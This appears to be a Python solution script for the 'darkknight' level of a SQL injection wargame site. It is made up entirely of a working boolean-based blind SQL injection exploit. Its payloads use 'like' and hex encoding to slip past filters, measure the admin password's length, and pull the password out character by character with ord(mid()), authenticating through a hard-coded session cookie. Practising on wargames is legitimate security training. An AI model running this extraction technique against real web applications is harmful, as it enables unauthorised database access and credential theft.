import requests

url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?'
cookies={'PHPSESSID' : '9dqlh2dhb390omeha65bt457ns'}

def password_length():
    len_pw=0
    while 1 :
        len_pw += 1
        print(len_pw)
        value = "1 || id like 0x61646d696e && length(pw) like {} #".format(len_pw)
        Parameter={'no':value}
        response = requests.get(url, params=Parameter, cookies=cookies)
        if "Hello admin" in response.text:
            print("password length : ", len_pw)
            break
    return len_pw

lenght = password_length()

def find_pw(len_pw):
    pw = ''
    for i in range(1, len_pw + 1):
        print(i, "번째 찾는 중")
        for j in range(32, 128):
            value = "1 || id like 0x61646d696e && ord(mid(pw, {}, 1)) like {} #".format(i, j)
            Parameter = {"no": value}
            response = requests.get(url, params=Parameter, cookies=cookies)
            print(url+'no='+value)
            if "Hello admin" in response.text:
                print(chr(j))
                pw += chr(j)
                break
    return pw

print(find_pw(lenght))